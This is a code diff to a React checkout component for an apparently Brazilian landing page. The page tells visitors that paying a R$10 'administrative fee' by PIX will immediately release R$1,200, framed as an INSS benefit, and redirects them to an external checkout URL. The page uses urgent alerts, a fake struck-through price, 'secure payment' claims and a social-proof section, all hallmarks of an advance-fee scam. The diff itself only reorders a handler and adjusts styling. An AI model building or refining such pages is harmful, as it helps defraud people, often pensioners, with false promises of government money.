@@ -101,10 +101,7 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
     taxSectionRef.current?.scrollIntoView({ behavior: 'smooth' });
   };
 
-  const handleEligibilityCheckClick = () => {
-    scrollToTaxSection();
-  };
-
+  
   const handleLiberarAcessoClick = () => {
     scrollToTaxSection(); // Scroll first
     // Timeout to allow scroll to be visible before alert
@@ -113,6 +110,10 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
       alert("🚨 ATENÇÃO: Você será redirecionado para o pagamento SEGURO da taxa administrativa de R$10,00. Liberação dos R$1.200,00 IMEDIATA após confirmação do PIX!");
       window.location.href = "https://kingspay.site/checkout/taxa-inss-2025"; 
     }, 100); 
+  };
+  
+  const handleEligibilityCheckClick = () => {
+    scrollToTaxSection();
   };
 
   const formattedCpf = cpf || '***.***.***-**';
@@ -163,14 +164,14 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
           </p>
         </div>
           
-        {/* Seção de Preço - Mantida */}
+        {/* Seção de Preço */}
         <div ref={taxSectionRef} className="text-center p-4 md:p-6 bg-primary/10 rounded-xl shadow-lg border-2 border-accent ring-2 ring-accent/50 space-y-2">
           <h3 className="font-headline text-xl md:text-2xl font-bold text-primary mb-1 uppercase flex items-center justify-center">
              <CheckCircle className="inline-block h-7 w-7 mr-1 text-accent" /> ÚNICA TAXA DE ACESSO!
           </h3>
           <p className="text-muted-foreground line-through text-2xl md:text-3xl mb-0">DE R$297,00</p>
-          <p className="text-7xl md:text-8xl font-extrabold text-accent mb-1">
-            R$10<span className="text-5xl md:text-6xl align-top">,00</span>
+          <p className="text-6xl md:text-8xl font-extrabold text-accent mb-1">
+            R$10<span className="text-4xl md:text-6xl align-top">,00</span>
           </p>
           <p className="text-lg md:text-xl font-bold text-primary mb-2 uppercase">(VOCÊ ACABA DE ECONOMIZAR R$287,00 HOJE!)</p>
           <p className="text-sm md:text-md text-foreground/90 max-w-lg mx-auto">
@@ -188,7 +189,7 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
           <ShieldCheck className="h-4 w-4 mr-1 text-green-600" /> Pagamento 100% SEGURO e Criptografado! Processado por AppMax.
         </div>
         
-        {/* SEÇÃO DE PROVA SOCIAL - Mantida */}
+        {/* SEÇÃO DE PROVA SOCIAL */}
         <div>
            <h3 className="font-headline text-lg md:text-xl font-bold text-foreground text-center mb-5 uppercase flex items-center justify-center">
             <Users className="mr-2 h-7 w-7" /> 
@@ -241,6 +242,7 @@ export default OfferStep;
     
 
     
+
 
 
 
